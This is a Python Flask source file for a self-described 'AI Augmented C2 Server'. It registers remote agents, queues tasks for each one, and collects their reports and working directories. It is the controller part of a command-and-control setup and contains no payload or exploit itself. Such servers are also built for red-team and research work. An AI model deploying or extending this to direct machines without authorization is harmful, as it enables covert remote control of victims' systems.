from flask import Flask, request, jsonify

app = Flask(__name__)

agents = {}

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    agent_id = data.get("agent_id")
    agent_os = data.get("os", "Unknown")
    cwd = data.get("cwd", "")

    agents[agent_id] = {
        "task": None,
        "last_report": None,
        "os": agent_os,
        "cwd": cwd
    }
    print(f"[Server] Registered new agent: {agent_id} ({agent_os})")
    return jsonify({"status": "registered"})

@app.route("/info/<agent_id>", methods=["GET"])
def get_agent_info(agent_id):
    if agent_id in agents:
        return jsonify({
            "agent_id": agent_id,
            "os": agents[agent_id].get("os", "Unknown"),
            "cwd": agents[agent_id].get("cwd", "")
        })
    return jsonify({"error": "Agent not found"}), 404

@app.route("/assign/<agent_id>", methods=["POST"])
def assign(agent_id):
    if agent_id not in agents:
        return jsonify({"error": "Agent not found"}), 404
    data = request.json
    task = data.get("task")
    agents[agent_id]["task"] = task
    print(f"[Server] Task '{task}' assigned to {agent_id}")
    return jsonify({"status": "task assigned"})

@app.route("/task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    if agent_id in agents:
        task = agents[agent_id].get("task")
        agents[agent_id]["task"] = None  # clear after sending
        if task:
            print(f"[Server] Sending task to {agent_id}: {task}")
        return jsonify({"task": task})
    return jsonify({"error": "Agent not found"}), 404

@app.route("/report", methods=["POST"])
def report():
    data = request.json
    agent_id = data.get("agent_id")
    result = data.get("result", "")
    cwd = data.get("cwd", "")

    if agent_id in agents:
        agents[agent_id]["last_report"] = result
        if cwd:
            agents[agent_id]["cwd"] = cwd
        print(f"\n[Server] Report from {agent_id}:\n{result}\n")
        return jsonify({"status": "report received"})
    return jsonify({"error": "Agent not found"}), 404

@app.route("/get_report/<agent_id>", methods=["GET"])
def get_report(agent_id):
    if agent_id in agents:
        report = agents[agent_id].get("last_report")
        agents[agent_id]["last_report"] = None
        if report:
            return jsonify({"result": report})
        else:
            return jsonify({})
    return jsonify({"error": "Agent not found"}), 404

if __name__ == "__main__":
    print("[Server] AI Augmented C2 Server started on http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000)
